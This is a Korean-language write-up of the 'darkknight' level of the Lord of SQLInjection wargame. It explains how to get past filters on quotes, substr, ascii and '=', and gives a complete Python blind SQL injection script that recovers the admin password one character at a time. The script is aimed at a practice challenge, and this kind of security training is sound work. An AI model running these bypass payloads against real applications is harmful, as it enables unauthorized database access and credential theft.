---
title: "[ Lord of SQLInjection ] darknight"
date: 2023-03-25T10:52:29.014Z
categories: ['Wargame', 'Lord of SQLInjection']
tags: ['los', "web"]
---
![](/images/de1e47c1-d06a-41a5-b7d3-e03ca145d533-image.png)

<br>
<br>

### **문제 분석**
---

1. 싱글쿼터, substr, ascii, = 를 피러링 하고 있다
2. darknight의 pw를 찾으면 문제를 풀 수 있다.

<br>
<br>

### **문제 풀이**
---

싱글쿼터이 필터링 되기 때문에 admin을 입력하는데 제한이 된다.

또한 기존에 사용하던 함수 substr 등을 사용할 수 없다.

<br>

각 필터링은 다음과 같이 우회할 수 있다.
>
* 싱글쿼터 -> admin을 hex값으로 입력
* substr -> mid
* ascii -> ord

<br>

다음과 같은 코드로 문제를 해결할 수 있다.

```python
import requests

cookie = {'PHPSESSID': '사용자세션'}
address = 'https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php'

def find_length():
    pw_len = 1
    while 1:
        url = f"{address}?no=999 || id like 0x61646d696e %26%26 length(pw) like {pw_len}%23"
        res = requests.get(url, cookies=cookie)
        if "Hello admin" in res.text:
            print(f'[+] Password Length : {pw_len}')
            return pw_len
        pw_len += 1

def find_password(pw_len):
    answer = ''

    for i in range(1,pw_len+1):
        for j in range(48,123):
            if 58<= j <=64: continue;
            if 91<= j <=96: continue;
            url = f"{address}?no=999 || id like 0x61646d696e %26%26 ord(mid(pw,{i},1)) like {j}%23"
            res = requests.get(url, cookies=cookie)
            if "Hello admin" in res.text:
                answer += chr(j)
                break
    print(f'[+] Find Password : {answer}')

find_password(find_length())
```

![](/images/603b5d91-57d8-4de3-ad13-5bec988258cf-image.png)
